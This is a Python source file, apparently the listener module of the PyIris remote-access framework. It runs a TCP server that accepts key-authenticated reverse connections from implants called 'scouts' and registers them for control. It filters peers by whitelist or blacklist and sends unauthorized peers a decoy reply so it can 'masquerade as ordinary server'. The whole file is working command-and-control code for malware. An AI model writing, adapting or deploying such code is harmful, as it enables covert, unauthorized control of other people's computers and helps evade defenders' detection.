# API
# done
import socket
import pyiris_api.library.modules.should_listener_die as should_listener_die
import pyiris_api.library.modules.return_random_string as return_random_string
import pyiris_api.library.modules.recv_all as recv_all
from datetime import datetime


def main(self, host, port, name, reply):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host, port))
        s.listen(1)
        s.settimeout(2)
        local_copy_of_id = self.config.incremented_listener_id
        self.config.listener_database[str(self.config.incremented_listener_id)] = [host, str(port), name,
                                                                         datetime.now().strftime('%Y-%m-%d %H:%M:%S'), []]
        self.config.incremented_listener_id += 1
        self.log.pos('Successfully started listener thread at : ' + host + ':' + str(port))
        self.config.change = True
        self.config.thread_message = ['pos', 'Successfully started listener thread at : ' + host + ':' + str(port)]
        while True:
            try:
                if should_listener_die.main(self, str(local_copy_of_id)):
                    self.log.blank("\n")
                    self.log.pos('Listener at : ' + host + ':' + str(port) + ' , received kill message, exiting...')
                    self.config.change = True
                    return
                else:
                    try:
                        conn, addr = s.accept()
                    except (socket.timeout, socket.error):
                        continue
                    if self.config.white_list:
                        if addr[0] not in self.config.white_list:
                            conn.sendall(reply.encode()) # masquerade as ordinary server without showing length byte and seperator
                            conn.close()
                            continue
                    elif self.config.black_list:
                        if addr[0] in self.config.black_list:
                            conn.sendall(reply.encode()) # masquerade as ordinary server without showing length byte and seperator
                            conn.close()
                            continue
                    if conn:
                        await_key = recv_all.main(conn, 5)
                        conn.settimeout(None)
                        if await_key == self.config.key:
                            self.log.blank("\n")
                            self.log.pos('Connection received from scout : ' + addr[0] + ':' + str(addr[1]) + ' -> ' + host + ':' + str(port))
                            self.config.thread_message = ['pos', 'Connection received from scout : ' + addr[0] + ':' + str(addr[1]) + ' -> ' + host + ':' + str(port)]
                            self.config.scout_database[str(self.config.incremented_scout_id)] = [conn, addr[0], str(addr[1]),
                                                                                       host + ':' + str(port),
                                                                                       return_random_string.main(5),
                                                                                       datetime.now().strftime(
                                                                                           '%Y-%m-%d %H:%M:%S'),
                                                                                       'Reverse']
                            self.config.listener_database[str(local_copy_of_id)][4].append(addr[0] + ':' + str(addr[1]))
                            self.config.incremented_scout_id += 1
                            self.config.change = True
                        else:
                            self.log.err("Invalid key was supplied from scout, denying connection...")
                            conn.sendall(reply.encode()) # masquerade as ordinary server without showing length byte and seperator
                            conn.close()
                    else:
                        conn.close()
            except socket.error:
                continue
    except Exception as e:
        self.log.blank("\n")
        self.log.war('Error in listener thread : ' + str(e) + ', killing thread...')
        self.config.thread_message = ['neg', 'Error in listener thread : ' + str(e) + ', killing thread']
        self.config.change = True
        try:
            del (self.config.listener_database[str(local_copy_of_id)])
            self.config.change = True
        except (IndexError, ValueError, UnboundLocalError):
            pass
